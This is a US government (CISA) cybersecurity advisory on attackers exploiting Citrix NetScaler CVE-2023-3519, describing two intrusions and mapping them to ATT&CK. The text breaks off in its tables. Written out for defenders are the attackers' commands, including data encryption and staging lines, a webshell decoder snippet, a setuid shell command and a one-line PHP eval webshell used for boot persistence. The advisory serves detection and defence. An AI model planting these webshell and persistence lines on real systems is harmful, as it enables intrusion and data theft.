{"markdown": "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Threat Actors Exploiting Citrix CVE\\-2023\\-3519 to Implant Webshells \\| CISA\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[Skip to main content](#main) \n\n\n\n\n\n\n\n\n\n\n\n\n![U.S. flag](/profiles/cisad8_gov/themes/custom/gesso/dist/images/us_flag_small.png)\n\n\n\n An official website of the United States government\n \n\n\n\n Here\u2019s how you know\n \n\n\n\n\n\n Here\u2019s how you know\n \n\n\n\n\n\n\n![Dot gov](/profiles/cisad8_gov/themes/custom/gesso/dist/images/icon-dot-gov.svg)\n\n\n**Official websites use .gov** \n  \n\n A\n **.gov** \n website belongs to an official government organization in the United States.\n \n\n\n\n\n\n![HTTPS](/profiles/cisad8_gov/themes/custom/gesso/dist/images/icon-https.svg)\n\n\n**Secure .gov websites use HTTPS** \n  \n\n A\n **lock** \n (\n \n\n\n Lock\n \n\n A locked padlock\n \n\n\n\n\n ) or\n **https://** \n means you\u2019ve safely connected to the .gov website. Share sensitive information only on official, secure websites.\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[Free Cyber Services](/resources-tools/resources/free-cybersecurity-services-and-tools \"Free Cyber Services\") \n[\\#protect2024](/protect2024) \n[Secure Our World](/node/18883) \n[Shields Up](/node/8056) \n[Report A Cyber Issue](/node/16591) \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[![CISA Logo Americas Cyber Defense Agency](/sites/default/files/images/SVG/header_logo_tagline_update.svg)](/)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[![CISA Logo](/sites/default/files/images/SVG/mobile_logo_wordmark.svg)](/)\n\n\n\n\n\n\n\n\n\n\n Search\n \n\n\n\n\n\n\n\n\n\n Menu\n \n\n\n\n\n\n\n\n\n\n\n\n\n![America's Cyber Defense Agency](/sites/default/files/images/SVG/header_tagline_mobile_update.svg)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Close\n \n\n\n\n\n* Topics\n \n\n\n\n[Topics](/topics) \n\n\n\n\n[Cybersecurity Best Practices](/topics/cybersecurity-best-practices)\n\n\n\n\n[Cyber Threats and Advisories](/topics/cyber-threats-and-advisories)\n\n\n\n\n[Critical Infrastructure Security and Resilience](/topics/critical-infrastructure-security-and-resilience)\n\n\n\n\n[Election Security](/topics/election-security)\n\n\n\n\n[Emergency Communications](/topics/emergency-communications)\n\n\n\n\n[Industrial Control Systems](/topics/industrial-control-systems)\n\n\n\n\n[Information and Communications Technology Supply Chain Security](/topics/information-communications-technology-supply-chain-security)\n\n\n\n\n[Partnerships and Collaboration](/topics/partnerships-and-collaboration)\n\n\n\n\n[Physical Security](/topics/physical-security)\n\n\n\n\n[Risk Management](/topics/risk-management)\n\n\n\n\n\n[How can we help?](/audiences) \n\n\n[Government](/topics/government) \n[Educational Institutions](/topics/educational-institutions) \n[Industry](/topics/industry) \n[State, Local, Tribal, and Territorial](/topics/state-local-tribal-and-territorial) \n[Individuals and Families](/topics/individuals-and-families) \n[Small and Medium Businesses](/topics/small-and-medium-businesses) \n[Find Help Locally](/audiences/find-help-locally) \n[Faith\\-Based Community](/audiences/faith-based-community) \n[Executives](/audiences/executives) \n[High\\-Risk Communities](/audiences/high-risk-communities)\n* [Spotlight](/spotlight)\n* Resources \\& Tools\n \n\n\n\n[Resources \\& Tools](/resources-tools) \n\n\n\n\n[All Resources \\& Tools](/resources-tools/all-resources-tools)\n\n\n\n\n[Services](/resources-tools/services)\n\n\n\n\n[Programs](/resources-tools/programs)\n\n\n\n\n[Resources](/resources-tools/resources)\n\n\n\n\n[Training](/resources-tools/training)\n\n\n\n\n[Groups](/resources-tools/groups)\n* News \\& Events\n \n\n\n\n[News \\& Events](/news-events) \n\n\n\n\n[News](/news-events/news)\n\n\n\n\n[Events](/news-events/events)\n\n\n\n\n[Cybersecurity Alerts \\& Advisories](/news-events/cybersecurity-advisories)\n\n\n\n\n[Directives](/news-events/directives)\n\n\n\n\n[Request a CISA Speaker](/news-events/request-speaker)\n\n\n\n\n[Congressional Testimony](/news-events/congressional-testimony)\n\n\n\n\n[CISA Conferences](/cisa-conferences)\n\n\n\n\n[CISA Live!](/cisa-live)\n* Careers\n \n\n\n\n[Careers](/careers) \n\n\n\n\n[Benefits \\& Perks](/careers/benefits-perks)\n\n\n\n\n[HireVue Applicant Reasonable Accommodations Process](/careers/hirevue-applicant-reasonable-accommodations-process)\n\n\n\n\n[Hiring](/general-recruitment-and-hiring-faqs)\n\n\n\n\n[Resume \\& Application Tips](/careers/resume-application-tips)\n\n\n\n\n[Students \\& Recent Graduates](/students-recent-graduates-employment-opportunities)\n\n\n\n\n[Veteran and Military Spouses](/careers/veteran-and-military-spouse-employment-opportunities)\n\n\n\n\n[Work @ CISA](/careers/work-cisa)\n* About\n \n\n\n\n[About](/about) \n\n\n\n\n[Culture](/about/culture)\n\n\n\n\n[Divisions \\& Offices](/about/divisions-offices)\n\n\n\n\n[Regions](/about/regions)\n\n\n\n\n[Leadership](/about/leadership)\n\n\n\n\n[Doing Business with CISA](/doing-business-cisa)\n\n\n\n\n[Site Links](/site-links)\n\n\n\n\n[Reporting Employee and Contractor Misconduct](/reporting-employee-and-contractor-misconduct)\n\n\n\n\n[CISA GitHub](/cisa-github)\n\n\n\n\n[CISA Central](/cisa-central)\n\n\n\n\n[2023 Year In Review](/about/2023YIR)\n\n\n\n\n[Contact Us](/about/contact-us)\n\n\n\n\n\n\n\n\n\n[Free Cyber Services](/resources-tools/resources/free-cybersecurity-services-and-tools \"Free Cyber Services\") \n[\\#protect2024](/protect2024) \n[Secure Our World](/node/18883) \n[Shields Up](/node/8056) \n[Report A Cyber Issue](/node/16591) \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Breadcrumb\n \n1. [Home](/)\n2. [News \\& Events](/news-events)\n3. [Cybersecurity Advisories](/news-events/cybersecurity-advisories)\n4. [Cybersecurity Advisory](/news-events/cybersecurity-advisories?f%5B0%5D=advisory_type%3A94)\n\n\n\n\n\n\n\n\n Share:\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Cybersecurity Advisory\n \nThreat Actors Exploiting Citrix CVE\\-2023\\-3519 to Implant Webshells\n====================================================================\n\n\n\n\n\n Release Date\n \n\n\n July 20, 2023\n \n\n\n\n\n Alert Code\n \n\n AA23\\-201A\n \n\n\n\n\n Related topics:\n \n\n[Critical Infrastructure Security and Resilience](/topics/critical-infrastructure-security-and-resilience) \n ,\n [Information Sharing](/topics/cyber-threats-and-advisories/information-sharing) \n ,\n [Cyber Threats and Advisories](/topics/cyber-threats-and-advisories) \n\n\n\n\n\n\n\n\n\n\n\n\n\n### **SUMMARY**\n\n\n##### ***Update September 6, 2023:***\n\n\n\n This Cybersecurity Advisory has been updated with new tactics, techniques, and procedures (TTPs) as well as indicators of compromise (IOCs) received from an additional victim and trusted third parties.\n \n\n\n##### ***Update End***\n\n\n\n The Cybersecurity and Infrastructure Security Agency (CISA) is releasing this Cybersecurity Advisory to warn network defenders about exploitation of CVE\\-2023\\-3519, an unauthenticated remote code execution (RCE) vulnerability affecting NetScaler (formerly Citrix) Application Delivery Controller (ADC) and NetScaler Gateway. In June 2023, threat actors exploited this vulnerability as a zero\\-day to drop a webshell on a critical infrastructure organization\u2019s non\\-production environment NetScaler ADC appliance. The webshell enabled the actors to perform discovery on the victim\u2019s active directory (AD) and collect and exfiltrate AD data. The actors attempted to move laterally to a domain controller but network\\-segmentation controls for the appliance blocked movement.\n \n\n\n\n The victim organization identified the compromise and reported the activity to CISA and Citrix. Citrix released a patch for this vulnerability on July 18, 2023\\.\n \n\n\n\n This advisory provides TTPs and detection methods shared with CISA by the victim. CISA encourages critical infrastructure organizations to use the detection guidance included in this advisory for help with determining system compromise. If potential compromise is detected, organizations should apply the incident response recommendations provided in this CSA. If no compromise is detected, organizations should immediately apply patches provided by Citrix.\n \n\n\n\n Download the PDF version of this report:\n \n\n\n\n\n[AA23\\-201A Threat Actors Exploiting Citrix CVE\\-2023\\-3519 to Implant Webshells](/sites/default/files/2023-10/aa23-201a_csa_threat_actors_exploiting_citrix-cve-2023-3519_to_implant_webshells.pdf) \n\n (PDF, 560\\.29 KB\n )\n \n\n\n##### ***Update September 6, 2023:***\n\n\n\n In August 2023, CISA received TTPs and IOCs from an additional victim and trusted third parties. This CSA has been updated with the TTPs and IOCs to assist administrators with detecting and responding to this activity.\n \n\n\n\n For a downloadable list of IOCs, see the following XML and JSON files:\n \n\n\n\n\n[AA23\\-201A STIX XML](/sites/default/files/2023-09/AA23-201A.stix_.xml) \n\n (XML, 43\\.13 KB\n )\n \n\n\n\n\n[AA23\\-201A STIX JSON](/sites/default/files/2023-09/AA23-201A%20Threat%20Actors%20Exploiting%20Citrix%20CVE%202023-3519%20to%20Implant%20Webshells%20-%20Update.stix_.json) \n\n (JSON, 40\\.09 KB\n )\n \n\n\n##### ***Update End***\n\n\n\n\n\n\n### **TECHNICAL DETAILS**\n\n\n\n**Note:** \n This advisory uses the\n [MITRE ATT\\&CK for Enterprise](https://attack.mitre.org/versions/v13/matrices/enterprise/ \"MITRE ATT&CK for Enterprise\") \n framework, version 13\\. See the MITRE ATT\\&CK Tactics and Techniques section for a table of the threat actors\u2019 activity mapped to MITRE ATT\\&CK\u00ae tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT\\&CK framework, see CISA and MITRE ATT\\&CK\u2019s\n [Best Practices for MITRE ATT\\&CK Mapping](https://www.cisa.gov/news-events/news/best-practices-mitre-attckr-mapping \"Best Practices for MITRE ATT&CK Mapping\") \n and CISA\u2019s\n [Decider Tool](https://github.com/cisagov/Decider/ \"Decider Tool\") \n .\n \n\n\n##### **Overview**\n\n\n\n In July 2023, a critical infrastructure organization reported to CISA that threat actors may have exploited a zero\\-day vulnerability in NetScaler ADC to implant a webshell on their non\\-production NetScaler ADC appliance. Citrix confirmed that the actors exploited a zero\\-day vulnerability: CVE\\-2023\\-3519\\. Citrix released a patch on July 18, 2023\\.\\[\n [1](https://support.citrix.com/article/CTX561482/citrix-adc-and-citrix-gateway-security-bulletin-for-cve20233519-cve20233466-cve20233467 \"Citrix ADC and Citrix Gateway Security Bulletin for CVE-2023-3519, CVE-2023-3466, CVE-2023-3467\") \n ]\n \n\n\n##### ***Update September 6, 2023:***\n\n\n\n In August 2023, CISA received TTPs and IOCs from an additional victim and third parties. The actors implanted a webshell, gained root level access to the compromised system, and performed discovery against the Active Directory (AD). For information, see the Victim 2 and Additional Observed Activity sections.\n \n\n\n##### ***Update End***\n\n\n##### **CVE\\-2023\\-3519**\n\n\n\n CVE\\-2023\\-3519 is an unauthenticated RCE vulnerability affecting the following versions of NetScaler ADC and NetScaler Gateway:\\[\n [1](https://support.citrix.com/article/CTX561482/citrix-adc-and-citrix-gateway-security-bulletin-for-cve20233519-cve20233466-cve20233467 \"Citrix ADC and Citrix Gateway Security Bulletin for CVE-2023-3519, CVE-2023-3466, CVE-2023-3467\") \n ]\n \n\n\n* NetScaler ADC and NetScaler Gateway\u202f13\\.1\u202fbefore\u202f13\\.1\\-49\\.13\n* NetScaler ADC and NetScaler Gateway\u202f13\\.0\u202fbefore 13\\.0\\-91\\.13\n* NetScaler ADC and NetScaler Gateway version 12\\.1, now end of life\n* NetScaler ADC 13\\.1\\-FIPS before 13\\.1\\-37\\.159\n* NetScaler ADC 12\\.1\\-FIPS before 12\\.1\\-55\\.297\n* NetScaler ADC 12\\.1\\-NDcPP before 12\\.1\\-55\\.297\n\n\n\n The affected appliance must be configured as a Gateway (VPN virtual server, ICA Proxy, CVPN, RDP Proxy) or authentication, authorization, and auditing (AAA)\u202fvirtual\u202fserver for exploitation.\\[\n [1](https://support.citrix.com/article/CTX561482/citrix-adc-and-citrix-gateway-security-bulletin-for-cve20233519-cve20233466-cve20233467 \"Citrix ADC and Citrix Gateway Security Bulletin for CVE-2023-3519, CVE-2023-3466, CVE-2023-3467\") \n ]\n \n\n\n\n CISA added CVE\\-2023\\-3519 to its\n [Known Exploited Vulnerabilities Catalog](/known-exploited-vulnerabilities-catalog \"Known Exploited Vulnerabilities Catalog\") \n on July 19, 2023\\.\n \n\n\n##### **Threat Actor Activity**\n\n\n##### *Victim 1*\n\n\n\n As part of their initial exploit chain \\[\n [T1190](https://attack.mitre.org/versions/v13/techniques/T1190/ \"Exploit Public-Facing Application\") \n ], the threat actors uploaded a TGZ file \\[\n [T1105](https://attack.mitre.org/versions/v13/techniques/T1105 \"Ingress Tool Transfer\") \n ] containing a generic webshell \\[\n [T1505\\.003](https://attack.mitre.org/versions/v13/techniques/T1505/003/ \"Server Software Component: Web Shell\") \n ], discovery script \\[\n [TA0007](https://attack.mitre.org/versions/v13/tactics/TA0007/ \"Discovery\") \n ], and\n `setuid` \n binary \\[\n [T1548\\.001](https://attack.mitre.org/versions/v13/techniques/T1548/001 \"Abuse Elevation Control Mechanism: Setuid and Setgid\") \n ] on the ADC appliance and conducted SMB scanning on the subnet \\[\n [T1046](https://attack.mitre.org/versions/v13/techniques/T1046/ \"Network Service Discovery\") \n ].\n \n\n\n\n The actors used the webshell for AD enumeration \\[\n [T1016](https://attack.mitre.org/versions/v13/techniques/T1016 \"System Network Configuration Discovery\") \n ] and to exfiltrate AD data \\[\n [TA0010](https://attack.mitre.org/versions/v13/tactics/TA0010/ \"Exfiltration \") \n ]. Specifically, the actors:\n \n\n\n* Viewed NetScaler configuration files\n `/flash/nsconfig/keys/updated/*` \n and\n `/nsconfig/ns.conf` \n \\[\n [T1005](https://attack.mitre.org/versions/v13/techniques/T1005 \"Data from Local System\") \n ].\n **Note:** \n These configuration files contain an encrypted password that can be decrypted by the key stored on the ADC appliance \\[\n [T1552\\.001](https://attack.mitre.org/versions/v13/techniques/T1552/001 \"Unsecured Credentials: Credentials In Files\") \n ].\n* Viewed the NetScaler decryption keys (to decrypt the AD credential from the configuration file) \\[\n [T1552\\.004](https://attack.mitre.org/versions/v13/techniques/T1552/004/ \"Unsecured Credentials: Private Keys\") \n ].\n* Used the decrypted AD credential to query the AD via\n `ldapsearch` \n . The actors queried for:\n\t+ Users (\n\t `objectClass=user` \n\t ) (\n\t `objectcategory=person` \n\t ) \\[\n\t [T1033](https://attack.mitre.org/versions/v13/techniques/T1033/ \"System Owner/User Discovery\") \n\t ]\n\t+ Computers (\n\t `objectClass=computer` \n\t ) \\[\n\t [T1018](https://attack.mitre.org/versions/v13/techniques/T1018/ \"Remote System Discovery\") \n\t ]\n\t+ Groups (\n\t `objectClass=group` \n\t ) \\[\n\t [T1069\\.002](https://attack.mitre.org/versions/v13/techniques/T1069/002/ \"Permission Groups Discovery: Domain Groups\") \n\t ]\n\t+ Subnets (\n\t `objectClass=subnet` \n\t )\n\t+ Organizational Units (\n\t `objectClass=organizationalUnit` \n\t )\n\t+ Contacts (\n\t `objectClass=contact` \n\t )\n\t+ Partitions (\n\t `objectClass=partition` \n\t )\n\t+ Trusts (\n\t `objectClass=trustedDomain` \n\t ) \\[\n\t [T1482](https://attack.mitre.org/versions/v13/techniques/T1482/ \"Domain Trust Discovery\") \n\t ]\n* Used the following command to encrypt discovery data collected via openssl in \u201ctar ball\u201d \\[\n [T1560\\.001](https://attack.mitre.org/versions/v13/techniques/T1560/001 \"Archive Collected Data: Archive via Utility\") \n ]:\n `tar -czvf - /var/tmp/all.txt | openssl des3 -salt -k <> -out /var/tmp/test.tar.gz` \n . (A \u201ctar ball\u201d is a compressed and zipped file used by threat actors for collection and exfiltration.)\n* Exfiltrated collected data by uploading as an image file\u00a0\\[\n [T1036\\.008](https://attack.mitre.org/versions/v13/techniques/T1036/008/ \"Masquerading: Masquerade File Type\") \n ] to a web\\-accessible path \\[\n [T1074](https://attack.mitre.org/versions/v13/techniques/T1074/) \n ]:\n `cp /var/tmp/test.tar.gz /netscaler/ns_gui/vpn/medialogininit.png` \n .\n\n\n\n The actors\u2019 other discovery activities were unsuccessful due to the critical infrastructure organization\u2019s deployment of their NetScaler ADC appliance in a segmented environment. The actors attempted to:\n \n\n\n* Execute a subnet\\-wide curl command to identify what was accessible from within the network as well as potential lateral movement targets.\n* Verified outbound network connectivity with a ping command (\n `ping -c 1 google.com` \n ) \\[\n [T1016\\.001](https://attack.mitre.org/versions/v13/techniques/T1016/001/ \"System Network Configuration Discovery: Internet Connection Discovery\") \n ].\n* Executed host commands for a subnet\\-wide DNS lookup.\n\n\n\n The actors also attempted to delete their artifacts \\[\n [TA0005](https://attack.mitre.org/versions/v13/tactics/TA0005/ \"Defense Evasion\") \n ]. The actors deleted the authorization configuration file (\n `/etc/auth.conf` \n )\u2014likely to prevent configured users (e.g., admin) from logging in remotely (e.g., CLI) \\[\n [T1531](https://attack.mitre.org/versions/v13/techniques/T1531/ \"Account Access Removal\") \n ]. To regain access to the ADC appliance, the organization would normally reboot into single use mode, which may have deleted artifacts from the device; however, the victim had a Secure Shell (SSH) key readily available that allowed them into the appliance without rebooting it.\n \n\n\n\n The actors\u2019 post\\-exploitation lateral movement attempts were also blocked by network\\-segmentation controls. The actors implanted a second webshell on the victim that they later removed. This was likely a PHP shell with proxying capability. The actors likely used this to attempt proxying SMB traffic to the DC \\[\n [T1090\\.001](https://attack.mitre.org/versions/v13/techniques/T1090/001/ \"Proxy: Internal Proxy\") \n ] (the victim observed SMB connections where the actors attempted to use the previously decrypted AD credential to authenticate with the DC from the ADC via a virtual machine). Firewall and account restrictions (only certain internal accounts could authenticate to the DC) blocked this activity.\n \n\n\n##### ***Update September 6, 2023:***\n\n\n##### *Victim 2*\n\n\n\n Threat actors uploaded a PHP webshell\n `*logouttm.php*` \n \\[\n [T1036\\.005](https://attack.mitre.org/versions/v13/techniques/T1036/005/ \"Masquerading: Match Legitimate Name or Location\") \n ], likely as part of their initial exploit chain, to\n `*/netscaler/ns_gui/vpn/` \n . Within an hour of installing the webshell, the actors implanted an Executable and Linkable Format (ELF) binary\n `pykeygen` \n that set user unique identifier (UID) to root and executed\n `/bin/sh` \n \\[\n [T1059\\.004](https://attack.mitre.org/versions/v13/techniques/T1059/004/ \"Command and Scripting Interpreter: Unix Shell\") \n ] via\n `setuid` \n and\n `execve syscall.*` \n \\[\n [T1106](https://attack.mitre.org/versions/v13/techniques/T1106/ \"Native API\") \n ].\n **Note:** \n A third party also observed threat actors use an ELF binary (named\n `pip4` \n ) to execute\n `/bin/sh` \n via\n `syscall` \n and change the UID to root.\n `pip4` \n was located at\n `/var/python/bin` \n .\n \n\n\n\n With root level access, the actors used hands\\-on\\-keyboard for discovery. They queried the AD via\n `ldapsearch` \n for users, groups, and computers.\u00a0They collected the data in gzipped text files renamed\n `1.css` \n and\n `2.css` \n and placed the files in\n `/netscaler/ns_gui/vpn/` \n for exfiltration.\n \n\n\n\n After exfiltrating the files,\u00a0the actors deleted them from the system \\[\n [T1070\\.004](https://attack.mitre.org/versions/v13/techniques/T1070/004 \"Indicator Removal: File Deletion\") \n ] as well as some access logs, error logs, and authentication logs \\[\n [T1070\\.002](https://attack.mitre.org/versions/v13/techniques/T1070/002 \"Indicator Removal: Clear Linux or Mac System Logs\") \n ].\u00a0The victim organization detected the intrusion and mitigated the activity but did not identify signs of additional malicious activity.\n \n\n\n\n For command and control (C2\\), the actors appeared to use compromised pfSense devices \\[\n [T1584](https://attack.mitre.org/versions/v13/techniques/T1584/ \"Compromise Infrastructure\") \n ]; the victim observed communications with two pfSense IP addresses indicating the actor was using them for multi\\-hop proxying C2 traffic \\[\n [T1090\\.003](https://attack.mitre.org/versions/v13/techniques/T1090/003/ \"Proxy: Multi-hop Proxy\") \n ].\n \n\n\n##### *Additional Observed Activity*\n\n\n\n According to trusted third party reporting, threat actors leveraged open source webshells and other publicly available tools \\[\n [T1588\\.002](https://attack.mitre.org/versions/v13/techniques/T1588/002/ \"Obtain Capabilities: Tool\") \n ]:\n \n\n\n* Loaded\n `loading[.]php` \n to\n `/vpn/vpn/` \n .\n `Loading[.]php` \n is a modified version of an open\\-source PHP webshell \\[\n [2](https://github.com/dxkite/php-stream-shell \"dxkite / php-stream-shell\") \n ]. The modified webshell had a custom protocol handler,\n `update://` \n , created via a\n `stream_wrapper_register` \n (https://www.php.net/manual/en/function.stream\\-wrapper\\-register\\[.]php). The custom protocol enabled the webshell to send encoded commands to the AD via\n `ldapsearch` \n :\n\n\n\n\n| `public function stream_open($path, $mode, $options, &$opened_path)`    `{`    `$this->code = hex2bin(substr(base64_decode(strrev(substr(substr($path,9),5))),2));`    `$this->position = 0;`    `return true;`    `}` |\n| --- |\n\n\n* Loaded a modified version of open\\-source SSH inject tool \\[\n [3](https://github.com/xpn/ssh-inject/blob/master/injectme.c \"xpn / ssh-inject\") \n ] named libnsd.so to the\n `/tmp` \n directory. The file hooks SSH and captures credentials. The actors' modifications to the tool wrote encoded captured credentials (20 random characters \\+ reversed/base64\\) to a file created in a hard\\-coded path (\n `/var/nslog/counters/prometheus/metrc_codes_client.log` \n ) \\[\n [T1074\\.001](https://attack.mitre.org/versions/v13/techniques/T1074/001/ \"Data Staged: Local Data Staging\") \n ]. The actors then exfiltrated the collected credentials and deleted\n `/var/nslog/counters/prometheus/metrc_codes_client.log` \n 3 minutes after exfiltration). (The deleted file was recreated, possibly because the actors\u2019 memory hook was still active.)\n* Deployed webshells to victim networks at\n `\\vpn\\themes` \n .\n\t+ One third party observed the actors deploy the SECRETSAUCE webshell. SECRETSAUCE is a webshell written in PHP. It can receive PHP code from an\n\t `HTTP POST` \n\t request, decrypt it using an internally embedded RSA public key \\[\n\t [T1140](https://attack.mitre.org/versions/v13/techniques/T1140/) \n\t ], and execute the code in memory; each request to the webshell returns an\n\t `HTTP 500` \n\t response code. The actor has used the following file names for SECRETSAUCE:\n\t `vpn[.]php` \n\t ,\n\t `logout[.]php` \n\t ,\n\t `log[.]php` \n\t ,\n\t `prod[.]php` \n\t \\[\n\t [T1036](https://attack.mitre.org/versions/v13/techniques/T1036/ \"Masquerading\") \n\t ].\n\t+ A second third party observed the actors deploy an open source webshell \\[\n\t [4](https://github.com/L-codes/Neo-reGeorg \"L-codes / Neo-reGeorg\") \n\t ] with filename\n\t `defaults.php` \n\t .\n* Deployed LIGOLO\\-NG \\[\n [5](https://github.com/Nicocha30/ligolo-ng \"nicocha30 / ligolo-ng\") \n ] tunneller with the filename\n `the` \n in the\n `/tmp` \n directory. LIGOLO\\-NG is a tunneller \\[\n [T1572](https://attack.mitre.org/versions/v13/techniques/T1572/ \"Protocol Tunneling\") \n ] written in Go that provides encrypted reverse TCP/TLS connections \\[\n [T1573\\.002](https://attack.mitre.org/versions/v13/techniques/T1573/002/ \"Encrypted Channel: Asymmetric Cryptography\") \n ] to a remote host.\n* Deployed the NPS tunneller \\[\n [6](https://github.com/ehang-io/nps \"ehang-io / nps\") \n ] to victim networks to the\n `/tmp` \n directory. NPS is an open source tunneller written in Go. It must be configured from the command line or via a configuration file. Features including support for most common protocols and extensions, including compression, encryption, and port reuse.\n\n\n\n Additionally, threat actors:\n \n\n\n* Appended\n `/flash/nsconfig/rc.netscaler` \n with:\n   \n\n`chmod u+s /bin/sh` \n  \n\n`echo \u201c<?php http_response_code(401);@eval(\\$_REQUEST[\u2018variable\u2019]);?>\u201d > /[redacted path to webshell]/[redacted].php` \n \\[\n [T1222\\.002](https://attack.mitre.org/versions/v13/techniques/T1222/002/ \"File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification\") \n ].\n\n\n\n The webshell path was in a web accessible folder, and the actors\u2019 modifications enabled them to run\n `/bin/sh` \n commands as root and enabled persistence because the webshell was run on every reboot \\[\n [T1547](https://attack.mitre.org/versions/v13/techniques/T1547/ \"Boot or Logon Autostart Execution\") \n ].\n \n\n\n* Used Sysinternals ADExplorer, a Microsoft tool for viewing and editing the AD \\[\n [7](https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer \"Active Directory Explorer v1.52\") \n ]. The actors dropped the tool to\n `C:\\Users\\<redacted>\\AppData\\Local\\Temp\\` \n  \n\n`ADExplorer.exe` \n and executed it with the following command:\n `ADExplorer.exe -snapshot \"\" <filename>.dat /accepteula` \n .\n\n\n\n***Update End***\n\n\n\n### **MITRE ATT\\&CK TACTICS AND TECHNIQUES**\n\n\n\n See Table 1\u2013Table 11 for all referenced threat actor tactics and techniques in this advisory.\n \n\n\n##### ***Update September 6, 2023***\n\n\n\n The tables have been updated with the following techniques:\n \n\n\n* Compromise Infrastructure \\[\n [T1584](https://attack.mitre.org/versions/v13/techniques/T1584/ \"Compromise Infrastructure\") \n ]\n* Obtain Capabilities: Tool \\[\n [T1588\\.002](https://attack.mitre.org/versions/v13/techniques/T1588/002/ \"Obtain Capabilities: Tool\") \n ]\n* Command and Scripting Interpreter: Unix Shell \\[\n [T1059\\.004](https://attack.mitre.org/versions/v13/techniques/T1059/004/ \"Command and Scripting Interpreter: Unix Shell\") \n ]\n* Native API \\[\n [T1106](https://attack.mitre.org/versions/v13/techniques/T1106/ \"Native API\") \n ]\n* Boot or Logon Autostart Execution \\[\n [T1547](https://attack.mitre.org/versions/v13/techniques/T1547/ \"Boot or Logon Autostart Execution\") \n ]\n* Proxy: Multi\\-hop Proxy \\[\n [T1090\\.003](https://attack.mitre.org/versions/v13/techniques/T1090/003/ \"Proxy: Multi-hop Proxy\") \n ]\n* Deobfuscate/Decode Files or Information \\[\n [T1140](https://attack.mitre.org/versions/v13/techniques/T1140/ \"Deobfuscate/Decode Files or Information\") \n ]\n* File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification \\[\n [T1222\\.002](https://attack.mitre.org/versions/v13/techniques/T1222/002/ \"File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification\") \n ]\n* Indicator Removal \\[\n [T1070](https://attack.mitre.org/versions/v13/techniques/T1070/ \"Indicator Removal\") \n ]\n* Indicator Removal: Clear Linux or Mac System Logs \\[\n [T1070\\.002](https://attack.mitre.org/versions/v13/techniques/T1070/002/ \"Indicator Removal: Clear Linux or Mac System Logs\") \n ]\n* Indicator Removal: File Deletion \\[\n [T1070\\.004](https://attack.mitre.org/versions/v13/techniques/T1070/004 \"Indicator Removal: File Deletion\") \n ]\n* Masquerading \\[\n [T1036](https://attack.mitre.org/versions/v13/techniques/T1036/ \"Masquerading\") \n ]\n* Masquerading: Match Legitimate Name or Location \\[\n [T1036\\.005](https://attack.mitre.org/versions/v13/techniques/T1036/005/ \"Masquerading: Match Legitimate Name or Location\") \n ]\n* Data Staged: Local Data Staging \\[\n [T1074\\.001](https://attack.mitre.org/versions/v13/techniques/T1074/001/ \"Data Staged: Local Data Staging\") \n ]\n* Protocol Tunneling \\[\n [T1572](https://attack.mitre.org/versions/v13/techniques/T1572/ \"Protocol Tunneling\") \n ]\n\n\n##### ***End Update***\n\n\n\n\n\n*Table 1: Cyber Threat Actors ATT\\&CK Techniques for Resource Development* \n\n| **Technique Title** | **ID** | **Use** |\n| --- | --- | --- |\n| Compromise Infrastructure | [T1584](https://attack.mitre.org/versions/v13/techniques/T1584/ \"Compromise Infrastructure\") | The threat actors appear to have used compromised pfSense devices to proxy C2 traffic to Victim 2\\. |\n| Obtain Capabilities: Tool | [T1588\\.002](https://attack.mitre.org/versions/v13/techniques/T1588/002/) | The threat actors leveraged open source webshells \\[  [2](https://github.com/dxkite/php-stream-shell \"dxkite / php-stream-shell\")   ] \\[  [4](https://github.com/L-codes/Neo-reGeorg \"L-codes / Neo-reGeorg\")   ] and other publicly available tools, including a modified version of open\\-source SSH inject tool \\[  [3](https://github.com/xpn/ssh-inject/blob/master/injectme.c \"xpn / ssh-inject\")   ], LIGOLO\\-NG \\[  [5](https://github.com/Nicocha30/ligolo-ng \"nicocha30 / ligolo-ng\")   ] tunneller, and NPS tunneller \\[  [6](https://github.com/ehang-io/nps \"ehang-io / nps\")   ]. |\n\n\n\n\n\n\n\n\n\n*Table 2: Cyber Threat Actors ATT\\&CK Techniques for Initial Access* \n\n| **Technique Title** | **ID** | **Use** |\n| --- | --- | --- |\n| Exploit Public\\-Facing Application | [T1190](https://attack.mitre.org/versions/v13/techniques/T1190/ \"Exploit Public-Facing Application\") | The threat actors exploited CVE\\-2023\\-3519 to implant a webshell on the organization\u2019s NetScaler ADC appliance. |\n\n\n\n\n\n\n\n\n\n*Table 3: Cyber Threat Actors ATT\\&CK Techniques for Execution* \n\n| **Technique Title** | **ID** | **Use** |\n| --- | --- | --- |\n| Command and Scripting Interpreter: Unix Shell | [T1059\\.004](https://attack.mitre.org/versions/v13/techniques/T1059/004/ \"Command and Scripting Interpreter: Unix Shell\") | The threat actors executed  `/bin/sh`   as root. |\n| Native API | [T1106](https://attack.mitre.org/versions/v13/techniques/T1106/ \"Native API\") | The threat actors executed  `/bin/sh`   via  `syscall`   . |\n\n\n\n\n\n\n\n\n\n*Table 4: Cyber Threat Actors ATT\\&CK Techniques for Persistence* \n\n| **Technique Title** | **ID** | **Use** |\n| --- | --- | --- |\n| Boot or Logon Autostart Execution | [T1547](https://attack.mitre.org/versions/v13/techniques/T1547/ \"Boot or Logon Autostart Execution\") | Threat actors used  `/flash/nsconfig/rc.netscaler`   rewrite a webshell on every reboot. |\n| Server Software Component: Web Shell | [T1505\\.003](https://attack.mitre.org/versions/v13/techniques/T1505/003 \"Server Software Component: Web Shell\") | The threat actors implanted a generic webshell on the organization\u2019s NetScaler ADC appliance. |\n\n\n\n\n\n\n\n\n\n*Table 5: Cyber Threat Actors ATT\\&CK Techniques for Privilege Escalation* \n\n| **Technique Title** | **ID** | **Use** |\n| --- | --- | --- |\n| Abuse Elevation Control Mechanism: Setuid and 